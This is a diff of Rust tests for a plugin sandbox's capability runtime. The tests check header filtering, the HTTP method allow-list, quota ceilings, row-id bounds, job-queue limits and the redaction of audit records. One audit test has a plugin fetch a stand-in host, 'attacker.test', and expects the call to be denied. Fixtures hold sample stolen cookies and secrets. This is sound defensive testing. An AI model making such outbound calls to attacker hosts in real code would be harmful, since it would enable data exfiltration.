@@ -1783,17 +2108,15 @@ path = "/shop/panel"
             ..CapabilityServices::none()
         };
         let mut first = CapabilityRuntime::new(&manifest, services.clone());
-        for id in 0..2 {
-            assert!(
-                first
-                    .dispatch(&CapabilityCall::KvGet {
-                        id,
-                        key: "k".to_owned()
-                    })
-                    .denial()
-                    .is_none()
-            );
-        }
+        assert!(
+            first
+                .dispatch(&CapabilityCall::KvGet {
+                    id: 1,
+                    key: "k".to_owned()
+                })
+                .denial()
+                .is_none()
+        );
         // A *second request* of the same plugin shares the bucket.
         let mut second = CapabilityRuntime::new(&manifest, services);
         assert_eq!(
@@ -1863,6 +2186,209 @@ path = "/shop/panel"
         );
     }
 
+    #[test]
+    fn a_response_header_a_plugin_may_not_see_never_reaches_it() {
+        // The response side of the outbound allow-list. Nothing exercised it,
+        // so deleting the filter left the suite green — and `set-cookie` from
+        // an upstream is a cookie the *plugin* then learns.
+        let mut fixture = fixture(&everything(), Some("alpha"));
+        fixture.http.answer(
+            "https://api.example.com/v1",
+            OutboundResponse {
+                status: 200,
+                headers: vec![
+                    ("content-type".to_owned(), "application/json".to_owned()),
+                    ("set-cookie".to_owned(), "session=stolen".to_owned()),
+                    ("x-upstream-secret".to_owned(), "s3cret".to_owned()),
+                ],
+                body: "{}".to_owned(),
+                final_url: "https://api.example.com/v1".to_owned(),
+            },
+        );
+        let result = fixture.runtime.dispatch(&CapabilityCall::HttpFetch {
+            id: 1,
+            method: "GET".to_owned(),
+            url: "https://api.example.com/v1".to_owned(),
+            headers: Vec::new(),
+            body: String::new(),
+        });
+        let CallResult::Ok {
+            value: CallValue::Http { headers, .. },
+            ..
+        } = result
+        else {
+            panic!("the call should have succeeded: {result:?}")
+        };
+        assert_eq!(
+            headers,
+            vec![("content-type".to_owned(), "application/json".to_owned())]
+        );
+    }
+
+    #[test]
+    fn a_method_or_header_count_outside_the_allow_list_is_refused() {
+        // A fresh fixture per case: the method check happens inside `perform`,
+        // after the per-capability charge, so five cases in one request would
+        // exhaust the default `outbound_calls` of four and turn the fifth
+        // refusal into a quota one.
+        for method in ["CONNECT", "TRACE", "OPTIONS", " GET", ""] {
+            let mut fixture = fixture(&everything(), Some("alpha"));
+            let result = fixture.runtime.dispatch(&CapabilityCall::HttpFetch {
+                id: 1,
+                method: method.to_owned(),
+                url: "https://api.example.com/".to_owned(),
+                headers: Vec::new(),
+                body: String::new(),
+            });
+            assert_eq!(result.denial(), Some(DenialReason::Malformed), "{method}");
+            assert!(fixture.http.seen().is_empty(), "{method} left the host");
+        }
+        let mut fixture = fixture(&everything(), Some("alpha"));
+        let many: Vec<(String, String)> = (0..=MAX_OUTBOUND_HEADERS)
+            .map(|_| ("accept".to_owned(), "*/*".to_owned()))
+            .collect();
+        assert_eq!(
+            fixture
+                .runtime
+                .dispatch(&CapabilityCall::HttpFetch {
+                    id: 2,
+                    method: "GET".to_owned(),
+                    url: "https://api.example.com/".to_owned(),
+                    headers: many,
+                    body: String::new(),
+                })
+                .denial(),
+            Some(DenialReason::Malformed)
+        );
+        assert!(fixture.http.seen().is_empty());
+    }
+
+    #[test]
+    fn every_byte_ceiling_a_quota_names_is_actually_applied() {
+        // Four ceilings that had no test between them, so four `if` statements
+        // nothing reached.
+        let mut manifest = manifest(&everything());
+        manifest.quotas.kv_value_bytes = 8;
+        manifest.quotas.db_rows = 2;
+        manifest.quotas.outbound_response_bytes = 8;
+        let http = RecordingHttp::new();
+        http.answer(
+            "https://api.example.com/big",
+            OutboundResponse::from_url("https://api.example.com/big", 200, "x".repeat(64)),
+        );
+        let db = db::MemoryPluginStore::new();
+        let mut runtime = CapabilityRuntime::new(
+            &manifest,
+            CapabilityServices {
+                kv: Some(MemoryKvStore::new() as Arc<dyn KvStore>),
+                db: Some(Arc::clone(&db) as Arc<dyn PluginStore>),
+                http: Some(Arc::clone(&http) as Arc<dyn OutboundHttp>),
+                ..CapabilityServices::none()
+            }
+            .for_tenant("alpha"),
+        );
+
+        // `kv_value_bytes`.
+        assert_eq!(
+            runtime
+                .dispatch(&CapabilityCall::KvSet {
+                    id: 1,
+                    key: "cart".to_owned(),
+                    value: PluginValue::Text("far too long a value".to_owned())
+                })
+                .denial(),
+            Some(DenialReason::QuotaExceeded)
+        );
+
+        // `db_rows`, both as the clamp on an explicit limit and as the default
+        // for `limit: 0`.
+        for index in 0..5 {
+            let inserted = runtime.dispatch(&CapabilityCall::DbInsert {
+                id: 10 + index,
+                table: "orders".to_owned(),
+                row: row(&[("sku", "A")]),
+            });
+            assert!(inserted.denial().is_none(), "{inserted:?}");
+        }
+        for (id, limit) in [(20, 0), (21, 100)] {
+            let result = runtime.dispatch(&CapabilityCall::DbQuery {
+                id,
+                table: "orders".to_owned(),
+                filter: PluginRow::new(),
+                limit,
+            });
+            let CallResult::Ok {
+                value: CallValue::Rows { rows },
+                ..
+            } = result
+            else {
+                panic!("the query should have succeeded: {result:?}")
+            };
+            assert_eq!(rows.len(), 2, "limit {limit} is clamped to `db_rows`");
+        }
+
+        // `outbound_response_bytes`.
+        assert_eq!(
+            runtime
+                .dispatch(&CapabilityCall::HttpFetch {
+                    id: 30,
+                    method: "GET".to_owned(),
+                    url: "https://api.example.com/big".to_owned(),
+                    headers: Vec::new(),
+                    body: String::new(),
+                })
+                .denial(),
+            Some(DenialReason::ResponseTooLarge)
+        );
+    }
+
+    #[test]
+    fn a_row_id_outside_its_bounds_is_refused_before_the_store_sees_it() {
+        let mut fixture = fixture(&everything(), Some("alpha"));
+        for row_id in [String::new(), "r".repeat(MAX_ROW_ID_BYTES + 1)] {
+            assert_eq!(
+                fixture
+                    .runtime
+                    .dispatch(&CapabilityCall::DbGet {
+                        id: 1,
+                        table: "orders".to_owned(),
+                        row_id: row_id.clone(),
+                    })
+                    .denial(),
+                Some(DenialReason::Malformed),
+                "{} bytes",
+                row_id.len()
+            );
+        }
+    }
+
+    #[test]
+    fn a_full_job_queue_is_a_denial_the_guest_can_read() {
+        // `MemoryJobSink::bounded` existed with no caller — test-support API
+        // written for a test that was never written, which is the same thing as
+        // an untested `BackendError` arm.
+        let sink = jobs::MemoryJobSink::bounded(1);
+        let mut runtime = CapabilityRuntime::new(
+            &manifest(&everything()),
+            CapabilityServices {
+                jobs: Some(Arc::clone(&sink) as Arc<dyn JobSink>),
+                ..CapabilityServices::none()
+            }
+            .for_tenant("alpha"),
+        );
+        let enqueue = |id| CapabilityCall::JobEnqueue {
+            id,
+            job_type: "reindex".to_owned(),
+            payload: PluginRow::new(),
+        };
+        assert!(runtime.dispatch(&enqueue(1)).denial().is_none());
+        assert_eq!(
+            runtime.dispatch(&enqueue(2)).denial(),
+            Some(DenialReason::BackendError)
+        );
+        assert_eq!(sink.queued().len(), 1);
+    }
+
     // ── Audit ────────────────────────────────────────────────────────
 
     #[test]
@@ -1874,28 +2400,29 @@ path = "/shop/panel"
                 status: 200,
                 headers: Vec::new(),
                 body: "ok".to_owned(),
+                final_url: "https://api.example.com/v1".to_owned(),
             },
         );
-        fixture.runtime.dispatch(&CapabilityCall::HttpFetch {
+        let _ = fixture.runtime.dispatch(&CapabilityCall::HttpFetch {
             id: 1,
             method: "GET".to_owned(),
             url: "https://api.example.com/v1".to_owned(),
             headers: Vec::new(),
             body: String::new(),
         });
-        fixture.runtime.dispatch(&CapabilityCall::HttpFetch {
+        let _ = fixture.runtime.dispatch(&CapabilityCall::HttpFetch {
             id: 2,
             method: "GET".to_owned(),
             url: "https://attacker.test/".to_owned(),
             headers: Vec::new(),
             body: String::new(),
         });
-        fixture.runtime.dispatch(&CapabilityCall::DbInsert {
+        let _ = fixture.runtime.dispatch(&CapabilityCall::DbInsert {
             id: 3,
             table: "orders".to_owned(),
             row: row(&[("sku", "A-1")]),
         });
-        fixture.runtime.dispatch(&CapabilityCall::JobEnqueue {
+        let _ = fixture.runtime.dispatch(&CapabilityCall::JobEnqueue {
             id: 4,
             job_type: "reindex".to_owned(),
             payload: PluginRow::new(),
@@ -1910,7 +2437,7 @@ path = "/shop/panel"
         assert_eq!(summary.tables.get("orders"), Some(&1));
         assert_eq!(summary.job_types.get("reindex"), Some(&1));
         assert_eq!(summary.denied.get("http-fetch"), Some(&1));
-        let rendered = summary.render("shop", std::time::Duration::from_secs(3600));
+        let rendered = summary.to_string();
         assert!(rendered.contains("api.example.com"), "{rendered}");
         assert!(rendered.contains("reindex"), "{rendered}");
     }
@@ -1918,12 +2445,12 @@ path = "/shop/panel"
     #[test]
     fn the_audit_record_never_carries_a_value() {
         let mut fixture = fixture(&everything(), Some("alpha"));
-        fixture.runtime.dispatch(&CapabilityCall::KvSet {
+        let _ = fixture.runtime.dispatch(&CapabilityCall::KvSet {
             id: 1,
             key: "cart".to_owned(),
             value: PluginValue::Text("the customer's card number".to_owned()),
         });
-        fixture.runtime.dispatch(&CapabilityCall::DbInsert {
+        let _ = fixture.runtime.dispatch(&CapabilityCall::DbInsert {
             id: 2,
             table: "orders".to_owned(),
             row: row(&[("note", "the customer's home address")]),
@@ -1935,26 +2462,5 @@ path = "/shop/panel"
             serialized.contains("cart"),
             "the key is a shape, not a value"
         );
-    }
-
-    #[test]
-    fn the_ledger_is_bounded_by_a_guests_call_rate() {
-        let mut manifest = manifest(&everything());
-        manifest.quotas.calls = MAX_QUOTA;
-        manifest.quotas.kv_reads = MAX_QUOTA;
-        let mut runtime = CapabilityRuntime::new(
-            &manifest,
-            CapabilityServices {
-                kv: Some(MemoryKvStore::new() as Arc<dyn KvStore>),
-                ..CapabilityServices::none()
-            },
-        );
-        for id in 0..(MAX_EVENTS as u64 * 2) {
-            runtime.dispatch(&CapabilityCall::KvGet {
-                id,
-                key: "k".to_owned(),
-            });
-        }
-        assert_eq!(runtime.events().len(), MAX_EVENTS);
     }
 }
